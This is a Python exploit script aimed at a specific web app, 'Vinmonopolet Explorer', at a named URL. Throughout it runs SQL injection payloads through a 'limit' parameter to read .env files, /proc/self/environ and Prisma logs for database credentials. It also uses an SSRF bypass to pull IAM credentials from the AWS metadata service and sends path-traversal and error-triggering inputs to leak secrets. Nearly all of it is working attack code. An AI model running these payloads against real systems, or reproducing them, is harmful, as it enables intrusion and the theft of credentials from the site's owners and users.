#!/usr/bin/env python3
import requests
import urllib.parse
import json
import time
import re
import argparse

# Target API endpoint
BASE_URL = "https://skrukork.app"  # Replace with actual target URL
API_ENDPOINT = f"{BASE_URL}/api/products"
IMAGE_CACHE_ENDPOINT = f"{BASE_URL}/api/products/image-cache"

def extract_db_credentials():
    """
    Use SQL injection to extract database credentials from environment variables
    The vulnerability is in the 'limit' parameter that gets inserted directly into SQL query
    """
    print("[*] Attempting to extract database credentials...")
    
    # In PostgreSQL, we can access environment variables using the pg_read_file function
    # Different payloads to try based on environment configuration and PostgreSQL version
    payloads = [
        # Directly read environment variables if possible 
        "1 UNION SELECT current_setting('env.DATABASE_URL'), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
        
        # Try to access .env file if it exists
        "1 UNION SELECT pg_read_file('.env'), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
        
        # Try to read process environment (if PostgreSQL has proper permissions)
        "1 UNION SELECT pg_read_file('/proc/self/environ'), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --"
    ]
    
    # Try to extract connection details from prisma logs
    prisma_log_payloads = [
        "1 UNION SELECT pg_read_file('/tmp/prisma-logs.txt'), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
        "1 UNION SELECT pg_read_file('/app/.prisma/logs.txt'), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
        "1 UNION SELECT pg_read_file('./logs/prisma.log'), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --"
    ]
    
    payloads.extend(prisma_log_payloads)
    
    # Also try to get database details directly
    db_details_payload = "1 UNION SELECT json_build_object('user', current_user, 'database', current_database(), 'version', version(), 'schemas', (SELECT array_agg(schema_name) FROM information_schema.schemata))::text, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --"
    payloads.append(db_details_payload)
    
    credentials_found = False
    
    for payload in payloads:
        print(f"[*] Trying payload: {payload[:60]}...")
        
        params = {
            "page": "1", 
            "limit": payload,
            "random": "true"
        }
        
        try:
            response = requests.get(API_ENDPOINT, params=params, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if "products" in data and len(data["products"]) > 0:
                    first_product = data["products"][0]
                    
                    # Look for database connection strings, passwords, etc.
                    connection_found = False
                    for key, value in first_product.items():
                        if isinstance(value, str):
                            # Look for PostgreSQL connection strings
                            if "postgresql://" in value or "postgres://" in value:
                                print(f"[+] Database connection string found: {value}")
                                connection_found = True
                                credentials_found = True
                            # Look for Neon database references
                            elif "neon.tech" in value:
                                print(f"[+] Neon database reference found: {value}")
                                connection_found = True
                                credentials_found = True
                            # Look for other potential credential-containing values
                            elif any(keyword in value.lower() for keyword in ["password", "pwd", "user", "username", "dbname", "database", "token", "key"]):
                                print(f"[+] Potential credential information found: {value[:100]}")
                                connection_found = True
                                credentials_found = True
                    
                    if connection_found:
                        print(f"[+] Success! Credentials extracted using payload: {payload}")
                    else:
                        print(f"[-] No credentials found in response for payload: {payload}")
            else:
                print(f"[-] Error: {response.status_code} - {response.text}")
        
        except Exception as e:
            print(f"[-] Exception: {e}")
        
        # Be nice to the server
        time.sleep(1)
    
    if not credentials_found:
        print("[-] Could not extract credentials using SQL injection.")

def exploit_ssrf_for_aws_metadata():
    """
    Use SSRF to access AWS metadata service and extract potential credentials
    """
    print("[*] Attempting to extract AWS metadata credentials...")
    
    # AWS metadata paths to check
    metadata_paths = [
        "latest/meta-data/",
        "latest/meta-data/iam/security-credentials/",
        "latest/user-data",
        "latest/meta-data/iam/security-credentials/s3access"  # Try a common role name
    ]
    
    for path in metadata_paths:
        # Craft URL to access AWS metadata service via SSRF
        metadata_url = f"169.254.169.254/{path}"
        
        # Bypass URL validation with @ character in URL
        ssrf_url = f"https://bilder.vinmonopolet.no@{metadata_url}"
        encoded_url = urllib.parse.quote(ssrf_url)
        
        params = {
            "url": encoded_url,
            "size": "small"
        }
        
        print(f"[*] Trying to access AWS metadata: {metadata_url}")
        
        try:
            # Make the request to the vulnerable endpoint
            response = requests.get(IMAGE_CACHE_ENDPOINT, params=params, timeout=5)
            
            # Check if we got a valid response
            if response.status_code == 200:
                content_type = response.headers.get("Content-Type", "")
                
                # If we got an image back, our SSRF might have worked
                if "image" in content_type:
                    print("[+] Received image response - checking for embedded metadata...")
                else:
                    print(f"[+] Received response: {response.text[:200]}...")
                
                # Look for AWS credential patterns in the response
                aws_cred_pattern = r'(?:"AccessKeyId"|"SecretAccessKey"|"SessionToken")'
                if re.search(aws_cred_pattern, response.text):
                    print(f"[!] AWS credentials potentially found in response!")
                    print(response.text)
            else:
                print(f"[-] Failed with status code: {response.status_code}")
        
        except Exception as e:
            print(f"[-] Exception: {e}")
        
        # Be nice to the server
        time.sleep(1)

def leak_env_through_error_messages():
    """
    Attempt to trigger error messages that might leak environment variables
    """
    print("[*] Attempting to leak environment variables through error messages...")
    
    # Try to cause errors that might include environment variable dumps
    error_payloads = [
        # Malformed URL that might trigger detailed error reporting
        "https://bilder.vinmonopolet.no/%00invalid",
        
        # URL that should cause internal server error
        "https://bilder.vinmonopolet.no/../../../../../../../etc/environment",
        
        # Extremely long URL to trigger buffer overflow errors
        "https://bilder.vinmonopolet.no/" + "A" * 10000
    ]
    
    for payload in error_payloads:
        print(f"[*] Trying to trigger error with payload: {payload[:60]}...")
        
        encoded_url = urllib.parse.quote(payload)
        
        params = {
            "url": encoded_url,
            "size": "small"
        }
        
        try:
            response = requests.get(IMAGE_CACHE_ENDPOINT, params=params, timeout=5)
            
            # Check if we got an error response that might contain environment data
            if response.status_code >= 400:
                print(f"[+] Got error response {response.status_code}")
                
                # Look for common environment variable patterns
                env_patterns = [r'DATABASE_URL', r'NEON_API_KEY', r'SECRET_KEY', r'API_KEY']
                for pattern in env_patterns:
                    if re.search(pattern, response.text):
                        print(f"[!] Found potential environment leak matching pattern '{pattern}'")
                        print(f"Context: {response.text[:500]}...")
            else:
                print(f"[-] No error response: {response.status_code}")
        
        except Exception as e:
            print(f"[-] Exception: {e}")
        
        # Be nice to the server
        time.sleep(1)

def identify_and_exploit_neon_database():
    """
    Use knowledge about Neon database to exploit the application
    """
    print("[*] Targeting Neon database specifically...")
    
    # From GitHub workflow, we know there's a Neon database
    # Try SQL injection with Neon-specific payloads
    neon_payloads = [
        # Try to get Neon connection info
        "1 UNION SELECT current_setting('neon.project_id'), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
        
        # Try to read Neon environment variables
        "1 UNION SELECT unnest(regexp_matches(pg_read_file('/proc/self/environ'), 'NEON[^=]+=([^\\x00]*)', 'g')), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --"
    ]
    
    for payload in neon_payloads:
        print(f"[*] Trying Neon-specific payload: {payload[:60]}...")
        
        params = {
            "page": "1", 
            "limit": payload,
            "random": "true"
        }
        
        try:
            response = requests.get(API_ENDPOINT, params=params, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                if "products" in data and len(data["products"]) > 0:
                    for product in data["products"]:
                        for key, value in product.items():
                            if isinstance(value, str) and ("neon" in value.lower() or "project_id" in value.lower()):
                                print(f"[+] Neon database information found: {value}")
            else:
                print(f"[-] Error: {response.status_code}")
        
        except Exception as e:
            print(f"[-] Exception: {e}")
        
        # Be nice to the server
        time.sleep(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Combined vulnerability exploit for Vinmonopolet Explorer")
    parser.add_argument("--all", action="store_true", help="Run all exploits")
    parser.add_argument("--sql", action="store_true", help="Run SQL injection for credentials")
    parser.add_argument("--ssrf", action="store_true", help="Run SSRF for AWS metadata")
    parser.add_argument("--error", action="store_true", help="Exploit error messages")
    parser.add_argument("--neon", action="store_true", help="Target Neon database specifically")
    
    args = parser.parse_args()
    
    print("Combined Vulnerability Exploit for Vinmonopolet Explorer")
    print("=====================================================")
    
    # Determine which exploits to run
    run_all = args.all or not (args.sql or args.ssrf or args.error or args.neon)
    
    if run_all or args.sql:
        extract_db_credentials()
        print()
    
    if run_all or args.ssrf:
        exploit_ssrf_for_aws_metadata()
        print()
    
    if run_all or args.error:
        leak_env_through_error_messages()
        print()
    
    if run_all or args.neon:
        identify_and_exploit_neon_database()
    
    print("\n[*] Exploitation attempts completed.")